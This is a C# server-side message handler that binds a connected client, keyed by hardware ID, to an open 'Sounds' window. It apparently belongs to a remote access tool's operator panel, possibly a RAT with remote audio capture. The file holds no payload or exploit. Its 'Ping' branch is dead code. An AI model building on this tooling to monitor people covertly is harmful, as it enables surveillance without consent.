using System.Linq;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerSound
{
	public static void Read(Clients client, object[] objects)
	{
		try
		{
			if (objects == null || objects.Length < 2)
			{
				client?.Disconnect();
			}
			else if (!(objects[1] is string command))
			{
				client?.Disconnect();
			}
			else if (command.Length > 100)
			{
				client?.Disconnect();
			}
			else if (command == "Ready")
			{
				FormSounds form = null;
				string hwid = null;
				if (!string.IsNullOrEmpty(client.Hwid))
				{
					if (client.Hwid.Length > 100)
					{
						client.Disconnect();
						return;
					}
					form = (FormSounds)Application.OpenForms["Sounds:" + client.Hwid];
					if (form != null)
					{
						hwid = client.Hwid;
					}
				}
				if (form == null)
				{
					foreach (Form openForm in Application.OpenForms)
					{
						if (!(openForm is FormSounds) || openForm.Name == null || !openForm.Name.StartsWith("Sounds:"))
						{
							continue;
						}
						FormSounds soundsForm = (FormSounds)openForm;
						if (soundsForm.parrent == null)
						{
							continue;
						}
						string formHwid = soundsForm.parrent.Hwid ?? "";
						if (formHwid.Length > 100)
						{
							continue;
						}
						bool match = false;
						if (soundsForm.parrent == client)
						{
							match = true;
						}
						else if (!string.IsNullOrEmpty(formHwid))
						{
							if (!string.IsNullOrEmpty(client.Hwid))
							{
								match = formHwid == client.Hwid;
							}
							else if (Application.OpenForms.Cast<Form>().Count((Form f) => f is FormSounds && f.Name != null && f.Name.StartsWith("Sounds:")) == 1)
							{
								match = true;
							}
						}
						if (match)
						{
							form = soundsForm;
							hwid = formHwid;
							if (!string.IsNullOrEmpty(hwid) && string.IsNullOrEmpty(client.Hwid))
							{
								client.Hwid = hwid;
							}
							break;
						}
					}
				}
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				if (string.IsNullOrEmpty(client.Hwid) && !string.IsNullOrEmpty(hwid))
				{
					client.Hwid = hwid;
				}
				form.Invoke((MethodInvoker)delegate
				{
					form.client = client;
					if (!string.IsNullOrEmpty(hwid))
					{
						form.Text = "Sounds [" + hwid + "]";
					}
				});
				client.Tag = form;
			}
			else if (command == "Ping")
			{
				if (client.Tag == null && !(command == "Ping"))
				{
				}
			}
			else
			{
				client.Disconnect();
			}
		}
		catch
		{
			client?.Disconnect();
		}
	}
}
